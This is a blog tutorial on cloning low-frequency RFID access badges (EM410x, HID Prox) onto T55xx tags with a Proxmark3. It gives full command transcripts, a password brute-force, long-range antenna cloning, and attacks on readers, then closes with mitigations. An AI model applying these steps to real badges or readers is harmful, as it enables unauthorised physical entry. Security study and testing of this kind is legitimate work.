---
title: "Cloning RFID tags for fun and profit"
date: 2021-04-20T16:27:00+02:00
draft: true
toc: false
images:
tags:
  - RFID
  - physical security
image:
  - /images/rfid/main.jpg
---

RFID tags are a technology commonly used but not limited to industrial purposes. These systems are in fact are used every day for payments, access control systems and as public transport passes.
Given the diffusion these tags have, it's important to understand how they work and the security implication of their use.

>Radio-frequency identification (RFID) uses electromagnetic fields to automatically identify and track tags attached to objects.  
>An RFID system consists of a tiny radio transponder, a radio receiver and transmitter. When triggered by an electromagnetic interrogation pulse from a nearby RFID reader device, 
>the tag transmits digital data, back to the reader. - [Wikipedia](https://en.wikipedia.org/wiki/Radio-frequency_identification)

![](/images/rfid/main.jpg)

### What's RFID?
RFID is a set of standards and technologies, that's because it includes multiple frequency ranges such as:
- LF: 120–150 kHz
- HF: 13.56 MHz
- UHF: 433 MHz
- UHF: 865–868 MHz (Europe) 902–928 MHz (North America) 
- microwave: 2450–5800 MHz
- microwave: 3.1–10 GHz 

In practice, only tags operating in the LF range are commonly called RFID tags, while tags operating in the HF range are called NFC tags.  
The rest are radio technologies not limited to the near field use like bluetooth.

There's a big difference between RFID and NFC tags, they operate on different frequencies, use different protocols, offer different features and have different uses.
Further considerations on the difference between these technologies are out of the scope of this article, but it's important not to confuse the two.

LF tags operate in the 120–150 kHz range, that limits the data transmission speed in favor of (theoretical) transmission distance. I say theoretical because the distance range is oftentimes limited by the passive tag implementation. 
While active tags exist, this article will focus on RFID LF passive tags since it's the most common variant found in everyday life.

RFID LF tags have poor transmission speed and distance but are incredibly cheap to produce and that's the reason they are widely employed where speed or distance are not fundamental.
One of the main uses of these tags see (industrial uses aside) is as access control tokens. It's common to see these tags in form of badges or key fobs, and these can be used to access homes, offices or critical infrastructures.

There are numerous models of RFID LF tags, each with it's features and peculiarities but the use as a security token is not ideal for one main reason: RFID LF tags can be an insecure option.

In this articles we will see how it's possible to read/write and clone these tags and what are the possible implications of a misuse of this technology.

### How to work with RFID tags
To work with RFID tags, specialized hardware is necessary.

Different devices exist:

- Chinese cloners
  Simple devices that read from one tag and write on another.
  Generally these hare handheld and feature read and write buttons only.
  Some are more advanced than others and can feature a little screen.
  Compatibility for frequencies and standards may vary.
  
- RFID Chameleon
  Developed to be used in RFID security assessments.
  Doesn't offer the most advanced features, but it's designed to be used in the field,
  it's battery powered and supports tag simulation and manipulation.
  It is also programmable and you can use it with an app.
  
  It's probably the best solution for a standalone use.
  More here: https://kasper-oswald.de/gb/chameleonmini/

- Proxmark3
  As the website puts it: Proxmark is an RFID swiss-army tool.
  It represent the state of the art when it comes to RFID research.
  It allows interacting with the tags both high and low level.
  Different versions have different features, including bluetooth support, battery pack
  swappable antennas and so on.
  
  It supports a standalone use, but it's more powerful when connected to a PC. It's to be 
  intended  as a research tool.
  
- Generic boards
  Other boards exist, these are usually sold as an Arduino add on, but dongles featuring
  the same integrated circuits are available.
  These are not widely used outside the makers world, but many are compatible with
  [`libnfc`](http://www.nfc-tools.org/index.php/Libnfc) and can useful to perform simple to advanced operations.

The only device that I have available is a Proxmark3 easy (cheap Chinese version) so this
article will focus on it's use, but the underlying concept about RFID tags should translate to other devices.

### Tags that emulate other tags
When it comes to working with RFID LF tags, there's one main player: the t55xx tag

These are a family of tags developed to emulate a wide range of regular tags.
This means that it's possible to clone most of the RFID tags around on one of these,
without having to carry writeable cards for each model.

This tag features 8 x 32 bit blocks in page 0 and 4 x 32 blocks in page 1.
Page 1 blocks are meant to be used for configuration purposes along with block 0 and 7 in page 0.
Blocks 1 to 6 in page 0 are dedicated to user data.

![](/images/rfid/t55xx.png#center)

Of course it's possible to work directly on the configuration blocks, that allows the emulation
of other tags, but it can lead to a brick!

![](/images/rfid/bricked.jpg#center)

### Cloning tags
Using the proxmark3 client, reading and writing devices is pretty straightforward.
First off you need to look for the device:

```
[usb] pm3 --> lf search

[=] NOTE: some demods output possible binary
[=] if it finds something that looks like a tag
[=] False Positives ARE possible
[=] 
[=] Checking for known tags...
[=] 
[+] EM 410x ID 1122334455
[+] EM410x ( RF/64 )
[=] -------- Possible de-scramble patterns ---------
[+] Unique TAG ID      : 8844CC22AA
[=] HoneyWell IdentKey
[+]     DEZ 8          : 03359829
[+]     DEZ 10         : 0573785173
[+]     DEZ 5.5        : 08755.17493
[+]     DEZ 3.5A       : 017.17493
[+]     DEZ 3.5B       : 034.17493
[+]     DEZ 3.5C       : 051.17493
[+]     DEZ 14/IK2     : 00073588229205
[+]     DEZ 15/IK3     : 000585269781162
[+]     DEZ 20/ZK      : 08080404121202021010
[=] 
[+] Other              : 17493_051_03359829
[+] Pattern Paxton     : 289899093 [0x11478255]
[+] Pattern 1          : 5931804 [0x5A831C]
[+] Pattern Sebury     : 17493 51 3359829  [0x4455 0x33 0x334455]
[=] ------------------------------------------------

[+] Valid EM410x ID found!
```

The proxmark found an EM410x tag! We can now try to read it:

```
[usb] pm3 --> lf em 410x reader
[+] EM 410x ID 1122334455
```

Let's try with another type of tag:

```
[usb] pm3 --> lf search

[=] NOTE: some demods output possible binary
[=] if it finds something that looks like a tag
[=] False Positives ARE possible
[=] 
[=] Checking for known tags...
[=] 
[+] [H10301] - HID H10301 26-bit;  FC: 118  CN: 1603    parity: valid
[=] raw: 000000000000002006ec0c86

[+] Valid HID Prox ID found!
```

It's an HID Prox tag, let's try and read it's ID:
```
[+] [H10301] - HID H10301 26-bit;  FC: 118  CN: 1603    parity: valid
[=] raw: 000000000000002006ec0c86
```

And just like that we got the devices ID, that's the authentication token!
If we can write this token on a t55xx tag, we can emulate the card and possibly gain access
to a restricted perimeter.

Let's see how it's done.
First we need to get a t55xx tag and position it on the reader, when empty this device
can't be found using `lf search`, so we can make sure it's a t55xx using the detect command:

```
[usb] pm3 --> lf t55xx detect
[=]  Chip type......... T55x7
[=]  Modulation........ ASK
[=]  Bit rate.......... 2 - RF/32
[=]  Inverted.......... No
[=]  Offset............ 32
[=]  Seq. terminator... Yes
[=]  Block0............ 00088048 (auto detect)
[=]  Downlink mode..... default/fixed bit length
[=]  Password set...... No
```
Now we can see the content of the TAG:

```
[usb] pm3 --> lf t55xx dump
[+] Reading Page 0:
[+] blk | hex data | binary                           | ascii
[+] ----+----------+----------------------------------+-------
[+]  00 | 00088048 | 00000000000010001000000001001000 | ...H
[+]  01 | 00000000 | 00000000000000000000000000000000 | ....
[+]  02 | 00000000 | 00000000000000000000000000000000 | ....
[+]  03 | 00000000 | 00000000000000000000000000000000 | ....
[+]  04 | 00000000 | 00000000000000000000000000000000 | ....
[+]  05 | 00000000 | 00000000000000000000000000000000 | ....
[+]  06 | 00000000 | 00000000000000000000000000000000 | ....
[+]  07 | 00000000 | 00000000000000000000000000000000 | ....
[+] Reading Page 1:
[+] blk | hex data | binary                           | ascii
[+] ----+----------+----------------------------------+-------
[+]  00 | 00088048 | 00000000000010001000000001001000 | ...H
[+]  01 | E03900D0 | 11100000001110010000000011010000 | .9..
[+]  02 | C60337D7 | 11000110000000110011011111010111 | ..7.
[+]  03 | 00A00003 | 00000000101000000000000000000011 | ....
```

Note that it's possible to read the device block by block too.

We see that the card doesn't contain user data, now we can try and emulate tags on it!
To do that we need to have the ID of the tags we want to emulate, and that's already done.
We can now go ahead and clone the tags, let's try the em410x first:

```
[usb] pm3 --> lf em 410x clone

Writes EM410x ID to a T55x7 or Q5/T5555 tag

usage:
    lf em 410x clone [-h] [--clk <dec>] --id <hex> [--q5]

options:
    -h, --help                     This help
    --clk <dec>                    <16|32|40|64> clock (default 64)
    --id <hex>                     ID number (5 hex bytes)
    --q5                           specify writing to Q5/T5555 tag

examples/notes:
    lf em 410x clone --id 0F0368568B             -> write id to T55x7 tag
    lf em 410x clone --id 0F0368568B --q5        -> write id to Q5/T5555 tag

[usb] pm3 --> lf em 410x clone --id 1122334455
[+] Preparing to clone EM4102 to T55x7 tag with ID 1122334455 (RF/64)
[#] Clock rate: 64
[#] Tag T55x7 written with 0xff8c65298c94a940
```

We can now read the tag and verify that it emulates an em410x tag:
```
[usb] pm3 --> lf em 410x reader
[+] EM 410x ID 1122334455
```

Of course it's still a t55xx tag (and the `detect` command will tell you that) but it behaves
exactly like and em410x.

Now we can try with the HID Prox.
```
[usb] pm3 --> lf hid clone --r 000000000000002006ec0c86
[=] Preparing to clone HID tag using raw 000000000000002006ec0c86
[=] Done
```

And of course reading it reveals that it's cloned correctly:
```
usb] pm3 --> lf hid reader
[+] [H10301] - HID H10301 26-bit;  FC: 118  CN: 1603    parity: valid
[=] raw: 000000000000002006ec0c86
```

We now have two key fob tags copied on t55xx cards!

![](/images/rfid/cloned.jpg)

In this demo only HID Prox and em410x tags are examined, but it's possible to clone and work
with many more of these tags.

Since it's possible to emulate cards knowing the ID only, it's possible to clone some RFID LF cards since these have an ID printed to the card itself. 
This completely removes the limit of having to read the card.

At this point you might be wondering if it's THAT easy to clone a tag in the real world, the
answer is no. That's for a simple reason, the tag is passive and if we use the standard antennas
provided with whichever device, the reading range is limited to a few centimeters.

Luckily, it's possible to weaponize a bigger antenna! If we use a bigger and more powerful
antenna, it's possible to clone a LF tag from a usable distance. Of course the antenna will need to
be carried in some kind of backpack or messenger bag, but that's the price to be paid.

More here: https://www.youtube.com/watch?v=wYmVtNQPlF4  
(NOTE: many implementations exist!)

### Defeating password protection
When examining the t55xx tag, you may have noticed a parameter "Password set", that's because
this tag can be password protected!

```
[usb] pm3 --> lf t55xx protect -n 00001234
[=] Checking current configuration
[+] Wrote new password
[+] Validated new password
[+] Wrote modified configuration block
[!] ⚠️  Safety check: Could not detect if PWD bit is set in config block. Exits.
[?] Consider using the override parameter to force read.
[=] Block0 write detected, running `detect` to see if validation is possible
[=]  Chip type......... T55x7
[=]  Modulation........ ASK
[=]  Bit rate.......... 2 - RF/32
[=]  Inverted.......... No
[=]  Offset............ 33
[=]  Seq. terminator... Yes
[=]  Block0............ 000880F0 (auto detect)
[=]  Downlink mode..... default/fixed bit length
[=]  Password set...... Yes
[=]  Password.......... 00001234

[+] New configuration block 000880F0 password 00001234
[+] Success, tag is locked
```

At this point we can't operate on this tag without knowing the password, for instance
the `detect` command won't work as expected:

```
[usb] pm3 --> lf t55xx detect 
[!] ⚠️  Could not detect modulation automatically. Try setting it manually with 'lf t55xx config'
```

But it does if we specify the password:

```
[usb] pm3 --> lf t55xx detect -p 00001234
[=]  Chip type......... T55x7
[=]  Modulation........ ASK
[=]  Bit rate.......... 2 - RF/32
[=]  Inverted.......... No
[=]  Offset............ 33
[=]  Seq. terminator... Yes
[=]  Block0............ 000880F0 (auto detect)
[=]  Downlink mode..... default/fixed bit length
[=]  Password set...... Yes
[=]  Password.......... 00001234
```

Can we circumvent this? The simple answer is no.
The device is completely locked and without the password it's impossible to do anything.

Luckily the proxmark allows bruteforce attacks. 

While these works, they are really slow and instable to the point that it's hard to try all the 
possible passwords before the connection drops. It may seem that the password protection is effective and to be honest that's true if you don't have specialized tools, but with better devices success is granted.

Here's a demo on the tag we just password protected:
```
[usb] pm3 --> lf t55xx bruteforce -s 00000000 -e FFFFFFFF
[=] press 'enter' to cancel the command
[=] Search password range [00000000 -> FFFFFFFF]
.[=] Trying password 00000000
.[=] Trying password 00000001
.[=] Trying password 00000002
.[=] Trying password 00000003
.[=] Trying password 00000004
.[=] Trying password 00000005
.[=] Trying password 00000006
.[=] Trying password 00000007
.[=] Trying password 00000008
.[=] Trying password 00000009
.[=] Trying password 0000000A
.[=] Trying password 0000000B
.[=] Trying password 0000000C
.[=] Trying password 0000000D

[...]

.[=] Trying password 0000122D
.[=] Trying password 0000122E
.[=] Trying password 0000122F
.[=] Trying password 00001230
.[=] Trying password 00001231
.[=] Trying password 00001232
.[=] Trying password 00001233
.[=] Trying password 00001234
[=]  Chip type......... T55x7
[=]  Modulation........ ASK
[=]  Bit rate.......... 2 - RF/32
[=]  Inverted.......... No
[=]  Offset............ 33
[=]  Seq. terminator... Yes
[=]  Block0............ 000880F0 (auto detect)
[=]  Downlink mode..... default/fixed bit length
[=]  Password set...... Yes
[=]  Password.......... 00001234

[+] Found valid password: [ 00001234 ]
Downlink Mode used : default/fixed bit length

[+] time in bruteforce 1215 seconds
```

As you can see it took ~20 minutes to crack a 4 hex digit password.

### Attacks on RFID readers
Finally we can talk about attacks on the readers, there are two main attacks:
- Simulation
- Exfiltration

We saw that we can simulate a tag using the proxmark, but what if the ID we have read and simulated
doesn't have enough permission to grant us access somewhere?
In this scenario it's possible to use the ID as an upper limit, and simulate every ID lower than the read value hoping to find an ID with higher privileges. This attack is based on the assumption that lower IDs may have higher privileges because higher privileges are associated with users registered earlier into the system, hence the lower ID value.
As for the bruteforce attack this may take a while so it's not always usable.

A sneakier approach it so install a device such as the ESPKey inside the reader.
This allows to intercept data from the wires and to harvest valid IDs.
But of course require a physical access to the reader.

Using the proxmark is also possible to sniff data from a tag to a reader, but given the antenna range is not a widely used technique and personally I haven't tried it.

### Conclusions

This article shows how, with the right hardware, is possible to clone RFID tags with relatively low skills.  

What's scary it's how easy it is to "steal" valuable credentials, in an access control context a stolen ID could mean a loss for a business because of an unauthorized entry into a critical infrastructure.

Possible mitigations include using a stronger authentication mechanism and trainings on RFID security and how to keep access tokens safe. Simple precautions like using an RFID shield (test those! some doesn't work!) and avoiding to keep a tag in sight are often a huge improvement in access token security. 

A secure reader is also crucial. Some readers offer tamper detection mechanisms and try to detect and disable t55xx tags to avoid unauthorized entry.

RFID credentials cloning, together with social engineering are some of the strongest tool in the arsenal of a phyisical penetration tester.





